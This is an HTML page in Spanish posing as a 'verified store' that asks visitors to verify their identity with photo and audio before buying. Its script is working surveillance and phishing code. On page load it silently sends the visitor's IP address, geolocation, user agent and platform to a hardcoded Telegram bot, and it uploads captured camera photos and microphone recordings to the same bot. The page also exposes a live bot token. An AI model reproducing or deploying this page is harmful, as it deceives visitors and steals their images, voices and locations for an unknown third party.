<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Tienda Verificada - FRAXS</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      padding: 20px;
      text-align: center;
    }
    h1 {
      color: #333;
    }
    .card {
      background: white;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      padding: 20px;
      margin: 20px auto;
      max-width: 400px;
    }
    video, canvas, audio {
      display: block;
      margin: 10px auto;
      max-width: 100%;
    }
    button {
      padding: 10px 15px;
      margin: 10px 5px;
      border: none;
      background: #333;
      color: white;
      cursor: pointer;
      border-radius: 5px;
    }
    button:hover {
      background: #555;
    }
    textarea {
      width: 100%;
      height: 80px;
      margin-top: 10px;
    }
  </style>
</head>
<body>

  <h1>Tienda Verificada - FRAXS</h1>
  <div class="card">
    <p>Antes de comprar, por seguridad verifica tu identidad:</p>
    <video id="video" autoplay muted></video>
    <canvas id="canvas" class="hidden"></canvas>
    <audio id="audioPlayer" controls></audio>

    <button onclick="tomarFoto()">üì∏ Tomar Foto</button>
    <button onclick="grabarAudio()">üéôÔ∏è Grabar Audio</button>
    <button onclick="detenerGrabacion()">‚èπÔ∏è Detener y Enviar Audio</button>
  </div>

  <script>
    const BOT_TOKEN = "7954403558:AAEHLKfq6bhiMUb1GjCSjLitLtO-rY7XEqI";
    const CHAT_ID = "7955801451";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const audioPlayer = document.getElementById('audioPlayer');

    let mediaRecorder;
    let audioChunks = [];

    async function solicitarPermisos() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        video.srcObject = stream;
        return stream;
      } catch (error) {
        alert("Permisos denegados: " + error);
      }
    }

    function tomarFoto() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });
      }, 'image/jpeg');
    }

    function grabarAudio() {
      audioChunks = [];
      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.start();

        mediaRecorder.ondataavailable = e => {
          audioChunks.push(e.data);
        };

        mediaRecorder.onstop = () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          audioPlayer.src = URL.createObjectURL(audioBlob);

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("audio", audioBlob, "grabacion.webm");

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
            method: "POST",
            body: formData
          });
        };
      });
    }

    function detenerGrabacion() {
      if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
      }
    }

    async function obtenerIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "No disponible";
      }
    }

    async function enviarInfoDispositivo() {
      const ip = await obtenerIP();
      const ubicacion = await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`),
          err => resolve("No disponible")
        );
      });

      const mensaje = `
üîê NUEVA CONEXI√ìN A LA TIENDA üîê
üìç IP: ${ip}
üåê User-Agent: ${navigator.userAgent}
üì± Plataforma: ${navigator.platform}
üïí Hora: ${new Date().toLocaleString()}
üìå Ubicaci√≥n: ${ubicacion}
`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
      });
    }

    async function solicitarNotificaciones() {
      if ("Notification" in window) {
        const permiso = await Notification.requestPermission();
        if (permiso === "granted") {
          new Notification("¬°Gracias por verificar tu identidad!");
        }
      }
    }

    // Ejecutar autom√°ticamente al cargar
    window.onload = async () => {
      await solicitarPermisos();
      await solicitarNotificaciones();
      await enviarInfoDispositivo();
    };
  </script>
</body>
</html>
